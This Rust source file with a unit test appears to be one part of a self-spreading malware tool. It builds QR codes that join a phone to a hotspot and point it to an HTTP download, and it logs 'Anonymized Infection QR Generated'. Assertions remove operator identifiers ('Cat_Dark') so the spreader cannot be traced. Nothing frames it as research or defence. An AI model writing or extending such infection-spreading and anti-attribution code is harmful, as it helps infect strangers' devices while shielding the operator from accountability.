/// QR CODE GENERATOR (OFFLINE VIRAL ANONYMOUS SHARE)
/// Generates completely anonymized Wi-Fi intent QR codes concatenated with the internal HTTP Payload download URI.
/// Example Payload: WIFI:T:WPA;S:GLB_A8F2;P:X9k...;;http://192.168.43.1:8080/download

pub struct QrShare;

impl QrShare {
    /// Generates the raw string data to be encoded into the QR Matrix by the UI layer.
    pub fn generate_anonymized_payload(ssid: &str, psk: &str, server_ip: &str, port: u16) -> String {
        // Assertions for anonymity. A paranoid check before generating the payload.
        assert!(!ssid.contains("Cat"), "SSID must be strictly random. No Cat_Dark identifiers allowed.");
        assert!(!ssid.contains("operator"), "SSID must not contain operator traces.");

        // Construct standard Android/iOS readable WIFI configuration QR format
        let wifi_string = format!("WIFI:T:WPA;S:{};P:{};;", ssid, psk);
        
        // Append localized HTTP URI via newline or custom delimiter parsing expected by Cat_Dark receiver UI
        let uri = format!("http://{}:{}/download", server_ip, port);

        let final_qr_payload = format!("{}\n{}", wifi_string, uri);
        
        println!("[QR GENERATOR] Anonymized Infection QR Generated.");
        // println!("[QR GENERATOR] Debug Payload: {}", final_qr_payload); // Only in dev
        
        final_qr_payload
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_qr_anonymity_and_format() {
        let payload = QrShare::generate_anonymized_payload("GLB_F9A2C", "secretpass123", "192.168.43.1", 8080);
        assert!(payload.starts_with("WIFI:T:WPA;S:GLB_F9A2C;P:secretpass123;;"));
        assert!(payload.ends_with("http://192.168.43.1:8080/download"));
    }
}
